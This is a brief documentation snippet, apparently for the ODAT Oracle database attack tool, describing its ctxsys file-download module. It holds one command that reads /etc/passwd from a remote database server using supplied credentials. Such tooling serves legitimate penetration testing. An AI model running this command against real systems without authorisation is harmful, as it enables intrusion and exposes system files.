# Download files

This module can be used to download a file stored on the database server:

* To get the */etc/passwd* file of the remote database server:
```bash
./odat.py ctxsys -s $SERVER -d $SID -U $USER -P $PASSWORD --getFile /etc/passwd
```